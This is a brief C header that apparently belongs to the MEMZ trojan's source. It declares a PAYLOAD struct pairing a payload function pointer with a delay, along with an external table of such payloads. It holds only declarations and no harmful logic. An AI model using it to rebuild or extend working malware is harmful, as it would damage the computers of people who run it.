#pragma once
#include "MEMZ.h"

typedef struct {
	INT(*payloadFunction)(int, int);
	INT delay;
} PAYLOAD;

#define PAYLOADFUNC INT times, INT runtime
#define PAYLOADHEAD

extern PAYLOAD payloads[];
extern CONST size_t nPayloads;